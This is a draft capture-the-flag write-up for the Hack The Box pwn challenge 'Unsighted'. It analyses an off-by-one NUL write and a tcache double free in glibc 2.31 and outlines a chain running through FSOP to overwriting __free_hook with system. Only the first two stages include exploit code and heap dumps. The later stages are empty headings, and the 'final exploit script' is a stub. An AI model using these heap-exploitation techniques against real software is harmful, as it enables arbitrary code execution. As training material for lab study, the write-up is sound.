---
type: ctf-writeup
platform: hack-the-box
category: pwn
title: Unsighted
difficulty: hard
status: draft
solved: true
binary: ./unsighted
arch: amd64-64-little
libc: Ubuntu GLIBC 2.31-0ubuntu9.2
tags:
  - ctf
  - htb
  - pwn
link: https://app.hackthebox.com/challenges/Unsighted
solved_on: 2023-09-17
released: 2023-09-01
summary: Forged chunks, tcache poisoning, FSOP, all for the price of a single Off-by-one Null byte
visual:
    type: ascii
    content: |
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⡀⠀⡀⠀⠂⡀⢀⢰⠀⢂⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣐⣬⣄⣷⡀⢸⡃⡘⡸⡄⢸⠀⠀⡇⠀⢠⠀⠀⠀
        ⠀⠀⠀⠀⠀⣠⡴⠚⢉⢍⢂⣼⣴⣿⣿⣿⣷⣷⣷⣣⣏⣆⣼⠀⠀⠄⠀⠀⠀
        ⠀⠀⠀⢠⡞⠋⠀⡑⣮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣼⣆⣌⡠⢁⡤
        ⠀⠀⣰⠋⠀⣀⣺⣾⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁
        ⠀⡼⠁⢀⣿⣿⣿⡿⣿⡛⣿⣿⣿⡷⢸⣿⠀⠀⠀⠀⣹⣿⣿⣿⣟⠣⠀⠀⠀
        ⡰⠁⢀⣼⣿⠟⢿⡇⠹⣿⣿⣿⠟⠀⢠⡿⠀⠀⣠⣾⡿⣿⡥⠊⠁⠀⠀⠀⠀
        ⠁⢠⣾⠟⠁⠀⠈⠳⢿⣦⣠⣤⣦⣼⠟⠁⣠⣾⣿⣿⣟⠍⠒⠀⠠⠀⠀⠀⠀
        ⢠⡟⠁⢀⣀⣀⣀⣀⡀⠈⣉⣉⣡⣤⣶⣿⡿⡿⡿⡻⠥⠑⡀⠀⠀⠀⠀⠀⠀
        ⠏⡠⠚⠉⠋⢍⠋⢫⠋⠛⢹⢻⡟⠻⣟⢏⠌⢊⡌⠌⠄⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠂⠘⠂⠿⠈⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀
published: true
created_at: Tuesday, July 28th 2026, 6:33:56 pm
modified_at: Tuesday, August 4th 2026, 7:47:11 pm
---

# HTB Pwn - Unsighted

## Challenge Info

This [challenge](https://app.hackthebox.com/challenges/Unsighted) was authored by [ryaagard](https://app.hackthebox.com/users/222411).

> [!NOTE] Challenge Scenario
> Can you help me find my eyes?

Not much to go off but that most certainly suits the challenge.

## Binary Protections

| RELRO      | Canary       | NX         | PIE         |
| ---------- | ------------ | ---------- | ----------- |
| Full RELRO | Canary found | NX enabled | PIE enabled |

```zsh
$ ./libc.so.6 --version
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.2) stable release version 2.31.
```

## Program Architecture

We were given the source code for this challenge thankfully, which helped a lot as the vulnerability is quite hard to see (pun intended).

Also provided was `libc.so.6` which was helpful for identifying what heap exploits were possible for this challenge.

### Unsighted Source Code

```c title="unsighted.c" {71}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_CHUNKS  2
#define MAX_SIZE    0x100

char *CHUNKLIST[MAX_CHUNKS] = { NULL };

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void banner() {
    puts("banner");
}

int delete() {
    int idx;

    printf("Eye position: ");
    if (scanf("%d", &idx) <= 0)
        return 1;

    if ((idx < 0 || idx >= MAX_CHUNKS) || CHUNKLIST[idx] == NULL) {
        puts("Invalid index");
        return 1;
    }

    free(CHUNKLIST[idx]);

    return 0;
}

int add() {
    int idx;
    char *chunk;
    size_t size;

    printf("Eye position: ");
    if (scanf("%d", &idx) <= 0) 
        return 1;

    if (idx < 0 || idx >= MAX_CHUNKS) {
        puts("Invalid index");
        return 1;
    }

    printf("Eye size: ");
    if (scanf("%lu", &size) <= 0)
        return 1;

    if (size <= 0 || size > MAX_SIZE) {
        puts("Invalid size");
        return 1;
    }

    chunk = malloc(size);
    if (chunk <= 0)
        return 1;

    CHUNKLIST[idx] = chunk;

    printf("Eye color: ");
    read(0, CHUNKLIST[idx], size);
    puts("\nA step closer to escaping the darkness.");

    CHUNKLIST[idx][strcspn(CHUNKLIST[idx], "\n") + 1] = '\0';

    return 0;
}

void menu() {
    puts("1. Add eye");
    puts("2. Remove eye");
    puts("3. Exit");
    printf("$ ");
}

int main() {
    int choice;

    setup();
    banner();

    while (1) {
        menu();

        if (scanf("%d", &choice) <= 0)
            return 1;

        switch (choice) {
            case 1:
                if (add())
                    return 1;
                break;
            case 2:
                if (delete())
                    return 1;
                break;
            case 3:
                return 0;
            default:
                puts("Can you repeat that? I can't hear well its a little dark.");
                return 1;
        }
    }

    return 0;
}
```

As you can see this is quite a simple binary. It gives us the options to add or remove eyes, and that's about it.

We have no way to view the data of our eyes, which is the reason this challenge took me about a week to solve. In great honesty, I attempted this challenge with very little knowledge of the heap in general. My first solve of this challenge was absolutely horrific, and took about 256 attempts of bruteforcing until I realised there is a significantly more beautiful way to solve it.

I did replace the banner section in the source code as it was quite ugly in the source, but it was basically some pretty ascii art of an eyeball.

We must also note the limitations and constraints of this binary:

```c
#define MAX_CHUNKS 2
#define MAX_SIZE 0x100

char *CHUNKLIST[MAX_CHUNKS] = { NULL };
```

These lines seem to mean we can only have two chunks allocated at a time, with a max size of `{c} 0x100`, although, there are no lines in the code stopping us from allocating more than two chunks. The code only allows us to assign 2 chunks to be deleted or added at a time. So we need to be very careful with how and when we add or delete our chunks.

This essentially means we have control over only 2 chunks at a time. So let's say we add an eye with an index of 0, if we then add another eye with an index of 0, we lose the ability to free the first eye we added with the index of 0. Thankfully we have 2 eyes, and with that we can do some dancing around our allocations and frees to exploit this.

## Vulnerability Analysis

### 1. Off-by-one NUL Write

> [!bug] Vulnerability
> Off-by-one NUL write from `{c} CHUNKLIST[idx][strcspn(CHUNKLIST[idx], "\n") + 1] = '\0';`. This is quite an interesting line to unpack so let's do so.

Firstly lets talk about how `{c} strcspn()` works.

From the man pages:

```c
SYNOPSIS
     #include <string.h>

     size_t strspn(const char *s, const char *accept);
     size_t strcspn(const char *s, const char *reject);

DESCRIPTION
     strspn()
            The strspn() function calculates the length (in bytes) of the initial segment of s which consists entirely of bytes in accept.

     strcspn()
            The strcspn() function calculates the length of the initial segment of s which consists entirely of bytes not in reject.

            It is equivalent to

                (strpbrk(s, reject) ?: strnul(s)) - s

RETURN VALUE
     The strspn() function returns the number of bytes in the initial segment of s which consist only of bytes from accept.

     The strcspn() function returns the number of bytes in the initial segment of s which are not in the string reject.
```

Essentially `{c} strcspn()` searches through the bytes of the first argument which is the data of `{c} CHUNKLIST[idx]` (our "Eye color") for the second argument which is `{c} "\n"` returning the number of bytes in which it searched through until it reached its second argument.

This alone would be fine, but if you can notice, there is a `{c} +1` afterwards, and that is where the null byte is written, after the last `{c} "\n"` found, and with this, we can write a null byte after out of bounds. As long as we fill the malloc'd size and add a newline at the end.

This gives us a very small primitive, but a powerful one nonetheless, due to how the heap is laid out in memory.

Now if we go back to the constraints of the challenge, one of which being that we can only allocate chunk sizes of up to `{c} 0x100`. We might think, well, even if we could overwrite the size section of the next chunk with a null byte, it would be pointless as it already ends in `00`? But, malloc comes to the rescue, and stores chunk metadata before the user pointer and rounds chunk sizes to `{c} 0x10` alignment. A request of `{c} 0x100` therefore corresponds to an internal chunk size of `{c} 0x110`, whose size field is `{c} 0x111`!

This is what makes the exploit. Due to how GLIBC and the tcache works in version 2.31, we can abuse this primitive to bypass the double free checks.

### 2. Double Free and Use after Free

> [!bug] Double free and Use after free
> The `{c} delete()` function does not clear or null out the free'd chunks, allowing us to abuse double frees and use after free bugs. Although the binary uses `GLIBC 2.31` which has a few protections in place for double frees, so we have to get creative!

This lack of cleaning up of those free'd chunks allows us to do some incredibly strange things to the poor heap.

> The double-free verification scans only the tcache bin calculated from the chunk’s **current** size field.

That means you can place a chunk in one bin, modify its size, and then free it into another bin.

1. `{py} add(0, 0xf8)` -> `A`, internal size `{c} 0x100`
2. `{py} add(1, 0x100)` -> `B`, internal size `{c} 0x110`
3. `{py} delete(1)` -> `B` enters `{c} tcache[0x110]`
4. `{py} delete(0)` -> `A` enters `{c} tcache[0x100]`
5. `{py} add(0, 0xf8)` -> returns `A`
                  overflow `A` using the off by one null byte bug
                    `B.size`: `{c} 0x111` -> `{c} 0x100`
6. `{py} delete(0)` -> `A` enters `{c} tcache[0x100]`
7. `{py} delete(1)` -> free `B` again, entering `{c} tcache[0x100]` as well as `{c} tcache[0x110]`

Now we have a double free'd chunk: `B`! So let's get into how we exploit that.

## Exploit Development

This exploit is split into 8 stages:

1. Create overlapping tcache chunks using the off by one null byte bug.
2. Get malloc to return a fake chunk inside heap data.
3. Use that fake chunk to forge a 0x501 chunk.
4. Free that forged chunk into unsorted bin.
5. Use the unsorted-bin libc pointer to attack stdout.
6. Leak libc with FSOP.
7. Reuse the fake chunk to tcache-poison `{c} __free_hook`.
8. Set `{c} __free_hook` = `{c} system` and `{c} free("/bin/sh")`.

Of course there is a lot of heap feng shui between all of these steps, and it gets increasingly harder to understand, nevertheless I shall try my best to explain everything I can.

### Exploit Strategy

```text
off-by-one NUL
      |
      v
chunk size corruption
      |
      v
same chunk in two tcache bins
      |
      v
tcache fd overwrite
      |
      v
malloc returns fake chunk
      |
      v
forge 0x501 chunk
      |
      v
unsorted bin libc pointer
      |
      v
stdout FSOP leak
      |
      v
__free_hook = system
```

We also start with some helper methods:

```py
def malloc(p, idx, size, data, newline=True):
    p.sendlineafter(b"$ ", b"1")
    p.sendlineafter(b"Eye position: ", str(idx).encode())
    p.sendlineafter(b"Eye size: ", str(size).encode())
    if newline:
        p.sendlineafter(b"Eye color: ", data)
    else:
        p.sendafter(b"Eye color: ", data)

def free(p, idx):
    p.sendlineafter(b"$ ", b"2")
    p.sendlineafter(b"Eye position: ", str(idx).encode())
```

### Heap Chunk Size Primer

On amd64 glibc, malloc chunks include metadata and are aligned to `0x10`. This means the requested size and the internal chunk size are different.

| Request | Internal Chunk Size | Size Field |
| ------- | ------------------: | ---------: |
| `0x70`  |              `0x80` |     `0x81` |
| `0x78`  |              `0x80` |     `0x81` |
| `0xe0`  |              `0xf0` |     `0xf1` |
| `0xf0`  |             `0x100` |    `0x101` |
| `0x100` |             `0x110` |    `0x111` |

> [!note] PREV_INUSE
> `PREV_INUSE` is a metadata flag stored in the lowest-order bit of a chunk's size header. It indicates whether the physical chunk of memory immediately preceding the current chunk is allocated (in use) or free. So `0x100` becomes `0x101` when this is the case.

The flag is evaluated and managed as follows:

- **When Set (`1`):** The previous adjacent chunk is allocated. The allocator knows it cannot merge the current chunk with the previous one. As a result, the `prev_size` field of the current chunk is treated as arbitrary user data by the application.
- **When Cleared (`0`):** The previous adjacent chunk is free. The allocator's `prev_size` field contains the actual byte size of that previous free chunk. This allows the allocator to rapidly locate the preceding chunk and consolidate memory to prevent heap fragmentation.

I should probably write up on some glibc allocation/heap internals once I get the chance, so when I do, and if any of this is confusing, It'll hopefully clear some things up.

### Stage 1: Planting Fake Chunk Metadata

We start by allocating our first chunk with an index of 0, and then immediately free it so that we can use it again later. This is something we will do a lot to avoid losing access to chunks, we **have** to free them after allocation to ensure this.

```py
malloc(p, 0, 0xF0, b"Y" * 0x48 + p64(0x111))
free(p, 0)
```

Our first malloc is of size `{c} 0xF0`, which becomes `{c} 0x100` after malloc aligns it and adds space for the chunks metadata.

We partly fill this chunk with junk and then end it by planting a fake size of `{c} 0x111`, which we will hope to eventually poison the tcache into thinking is a real chunk.

This is the fundamental aspect of our exploit, creating this fake chunk that overlaps what the tcache will eventually think is a real chunk. Allowing us to edit the size data of the fake chunk at will by getting the original chunk of size `{c} 0xF0` out of the tcache bin whenever we need to.

We have essentially planted fake chunk metadata inside a chunk here:

```c {12-13}
0x000055e6d859d290    0x0000000000000000    ........   Chunk[1], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055e6d859d298    0x0000000000000101    ........
0x000055e6d859d2a0    0x0000000000000000    ........
0x000055e6d859d2a8    0x000055e6d859d010    ..U..Y..    [ ← 0x0000000000000000] (in [heap])
0x000055e6d859d2b0    0x5959595959595959    YYYYYYYY
0x000055e6d859d2b8    0x5959595959595959    YYYYYYYY
0x000055e6d859d2c0    0x5959595959595959    YYYYYYYY
0x000055e6d859d2c8    0x5959595959595959    YYYYYYYY
0x000055e6d859d2d0    0x5959595959595959    YYYYYYYY
0x000055e6d859d2d8    0x5959595959595959    YYYYYYYY
0x000055e6d859d2e0    0x5959595959595959    YYYYYYYY
0x000055e6d859d2e8    0x0000000000000111    ........
0x000055e6d859d2f0    0x000000000000000a    ........
```

As you can see at addresses `{c} 0x000055e6d859d2e8` we have our fake size, and `{c} 0x000055e6d859d2f0` is where we would want tcache to point to in the future if we want it to become a real chunk. So let's keep the offset `f0` in mind for the future.

### Stage 2: Creating Cross-Bin Tcache Overlap

Our next step is to stage our off-by-one null byte chunks:

```py
malloc(p, 0, 0x78, b"A" * 0x20)
malloc(p, 1, 0x100, b"B" * 0x20)
free(p, 0)
```

Doing this gives us chunk "A" of size `{c} 0x80` and chunk "B" of size `{c} 0x110`. These chunks are consecutive so we can reuse chunk "A" when we need to null out the lowest significant bit of the size field of chunk "B". We will want to do this later, because in order to forge the fake and unsorted-bin chunks, we need to do a little bit of heap feng shui. Which is why we free it immediately after allocating it.

We can think of chunk "A" as our off-by-one null byte chunk.

Now we need to prime the `{c} 0x110` tcache bin because later we want `{c} malloc(0x100)` to return a fake `{c} 0x110` chunk. tcache needs a nonzero count / plausible state for this size class.

```py
malloc(p, 0, 0x100, b"C" * 0x20)
free(p, 0)
```

```c wrap=false
0x000055a18b0d8000    0x0000000000000000    ........   Chunk[0], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8008    0x0000000000000291    ........
0x000055a18b0d8010    0x0000000000000000    ........
0x000055a18b0d8018    0x0000000100000000    ........
0x000055a18b0d8028    0x0001000100000000    ........
        ↓        [...]        ↓
0x000055a18b0d80c0    0x000055a18b0d83a0    ..U.....    [ ← 0x0000000000000000] (in [heap])
0x000055a18b0d80c8    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8100    0x000055a18b0d82a0    ..U.....    [ ← 0x0000000000000000] (in [heap])
0x000055a18b0d8108    0x000055a18b0d8530    ..U....0    [ ← 0x0000000000000000] (in [heap])
0x000055a18b0d8110    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8288    0x0000000000000000    ........
0x000055a18b0d8290    0x0000000000000000    ........   Chunk[1], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8298    0x0000000000000101    ........
0x000055a18b0d82a0    0x0000000000000000    ........
0x000055a18b0d82a8    0x000055a18b0d8010    ..U.....    [ ← 0x0000000000000000] (in [heap])
0x000055a18b0d82b0    0x5959595959595959    YYYYYYYY
0x000055a18b0d82b8    0x5959595959595959    YYYYYYYY
0x000055a18b0d82c0    0x5959595959595959    YYYYYYYY
0x000055a18b0d82c8    0x5959595959595959    YYYYYYYY
0x000055a18b0d82d0    0x5959595959595959    YYYYYYYY
0x000055a18b0d82d8    0x5959595959595959    YYYYYYYY
0x000055a18b0d82e0    0x5959595959595959    YYYYYYYY
0x000055a18b0d82e8    0x0000000000000111    ........
0x000055a18b0d82f0    0x000000000000000a    ........
        ↓        [...]        ↓
0x000055a18b0d8388    0x0000000000000000    ........
0x000055a18b0d8390    0x0000000000000000    ........   Chunk[2], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8398    0x0000000000000081    ........
0x000055a18b0d83a0    0x0000000000000000    ........
0x000055a18b0d83a8    0x000055a18b0d8010    ..U.....    [ ← 0x0000000000000000] (in [heap])
0x000055a18b0d83b0    0x4141414141414141    AAAAAAAA
0x000055a18b0d83b8    0x4141414141414141    AAAAAAAA
0x000055a18b0d83c0    0x000000000000000a    ........
        ↓        [...]        ↓
0x000055a18b0d8408    0x0000000000000000    ........
0x000055a18b0d8410    0x0000000000000000    ........   Chunk[3], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8418    0x0000000000000111    ........
0x000055a18b0d8420    0x4242424242424242    BBBBBBBB
0x000055a18b0d8428    0x4242424242424242    BBBBBBBB
0x000055a18b0d8430    0x4242424242424242    BBBBBBBB
0x000055a18b0d8438    0x4242424242424242    BBBBBBBB
0x000055a18b0d8440    0x000000000000000a    ........
0x000055a18b0d8448    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8518    0x0000000000000000    ........
0x000055a18b0d8520    0x0000000000000000    ........   Chunk[4], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8528    0x0000000000000111    ........
0x000055a18b0d8530    0x0000000000000000    ........
0x000055a18b0d8538    0x000055a18b0d8010    ..U.....    [ ← 0x0000000000000000] (in [heap])
0x000055a18b0d8540    0x4343434343434343    CCCCCCCC
0x000055a18b0d8548    0x4343434343434343    CCCCCCCC
0x000055a18b0d8550    0x000000000000000a    ........
        ↓        [...]        ↓
0x000055a18b0d8628    0x0000000000000000    ........
0x000055a18b0d8630    0x0000000000000000    ........   Chunk[5], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8638    0x0000000000000071    .......q
0x000055a18b0d8640    0x4444444444444444    DDDDDDDD
0x000055a18b0d8648    0x4444444444444444    DDDDDDDD
0x000055a18b0d8650    0x4444444444444444    DDDDDDDD
0x000055a18b0d8658    0x4444444444444444    DDDDDDDD
0x000055a18b0d8660    0x000000000000000a    ........
0x000055a18b0d8668    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8698    0x0000000000000000    ........
0x000055a18b0d86a0    0x0000000000000000    ........   Chunk[6], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d86a8    0x0000000000000071    .......q
0x000055a18b0d86b0    0x4545454545454545    EEEEEEEE
0x000055a18b0d86b8    0x4545454545454545    EEEEEEEE
0x000055a18b0d86c0    0x4545454545454545    EEEEEEEE
0x000055a18b0d86c8    0x4545454545454545    EEEEEEEE
0x000055a18b0d86d0    0x000000000000000a    ........
0x000055a18b0d86d8    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8708    0x0000000000000000    ........
0x000055a18b0d8710    0x0000000000000000    ........   Chunk[7], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8718    0x0000000000000071    .......q
0x000055a18b0d8720    0x4646464646464646    FFFFFFFF
0x000055a18b0d8728    0x4646464646464646    FFFFFFFF
0x000055a18b0d8730    0x4646464646464646    FFFFFFFF
0x000055a18b0d8738    0x4646464646464646    FFFFFFFF
0x000055a18b0d8740    0x000000000000000a    ........
0x000055a18b0d8748    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8778    0x0000000000000000    ........
0x000055a18b0d8780    0x0000000000000000    ........   Chunk[8], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8788    0x0000000000000071    .......q
0x000055a18b0d8790    0x4747474747474747    GGGGGGGG
0x000055a18b0d8798    0x4747474747474747    GGGGGGGG
0x000055a18b0d87a0    0x4747474747474747    GGGGGGGG
0x000055a18b0d87a8    0x4747474747474747    GGGGGGGG
0x000055a18b0d87b0    0x000000000000000a    ........
0x000055a18b0d87b8    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d87e8    0x0000000000000000    ........
0x000055a18b0d87f0    0x0000000000000000    ........   Chunk[9], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d87f8    0x0000000000000031    .......1
0x000055a18b0d8800    0x5858585858585858    XXXXXXXX
0x000055a18b0d8808    0x5858585858585858    XXXXXXXX
0x000055a18b0d8810    0x5858585858585858    XXXXXXXX
0x000055a18b0d8818    0x5858585858585858    XXXXXXXX
0x000055a18b0d8820    0x0000000000000000    ........   Chunk[10], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8828    0x0000000000000071    .......q
0x000055a18b0d8830    0x5757575757575757    WWWWWWWW
0x000055a18b0d8838    0x5757575757575757    WWWWWWWW
0x000055a18b0d8840    0x5757575757575757    WWWWWWWW
0x000055a18b0d8848    0x5757575757575757    WWWWWWWW
0x000055a18b0d8850    0x000000000000000a    ........
0x000055a18b0d8858    0x0000000000000000    ........
        ↓        [...]        ↓
0x000055a18b0d8888    0x0000000000000000    ........
0x000055a18b0d8890    0x0000000000000000    ........   Chunk[11], Flag=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
0x000055a18b0d8898    0x0000000000000021    .......!
0x000055a18b0d88a0    0x0a72656972726162    .reirrab
0x000055a18b0d88a8    0x0000000000000000    ........
0x000055a18b0d88b0    0x0000000000000000    ← Top Chunk
0x000055a18b0d88b8    0x0000000000020751    ← Top Chunk Size
```

### Stage 3: Returning the Fake Chunk

### Stage 4: Forging an Unsorted-Bin Chunk

### Stage 5: FSOP Leak Through Stdout

### Stage 6: Heap Repair

### Stage 7: `__free_hook` Poisoning

### Stage 8: Shell

### Reliability

### Final Exploit Script

```python {7-9}
#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./challenge", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)

def start():
    # return process(context.binary.path)
    return remote("host", 1337)

io = start()
io.interactive()
```

## Proof

```ansi
[[32m+[0m] stdout partial overwrite: success on attempt: 1
[[34m*[0m] libc leak -> 0x7f1723a24980
[[32m+[0m] libc base -> 0x7f1723839000
[[34m*[0m] unsorted-bin metadata repaired -> 0x7f1723a24be0
[[34m*[0m] __free_hook -> 0x7f1723a27b28
[[34m*[0m] __free_hook aligned target -> 0x7f1723a27b20
[[34m*[0m] malloc(0, '/bin/sh')
[[34m*[0m] system -> 0x7f172388e410
[[32m+[0m] overwrote __free_hook with system -> 0x7f172388e410
[[32m+[0m] free(0, '/bin/sh') -> system('/bin/sh')
[[32m+[0m] flag: HTB{f4k3_fl4g_4_t35t1ng}
```

## Lessons Learned

- A one-byte NUL overwrite can be enough to move a chunk between tcache size classes.
- Tcache double-free protections are size-class dependent in glibc 2.31.
- A fake chunk does not need to be a complete forged heap layout if it is only used through tcache.
- Unsorted-bin chunks are useful as libc leak sources because their `fd`/`bk` point into `main_arena`.
- FSOP can leak libc even when the binary has no normal print/view functionality.
- Heap exploits often require reusing the same primitive multiple times; here, the fake chunk is used to forge a large chunk, redirect stdout, repair metadata, and finally poison `__free_hook`.

## References

[FSOP by angelboy](https://www.slideshare.net/slideshow/play-with-file-structure-yet-another-binary-exploit-technique/81635564)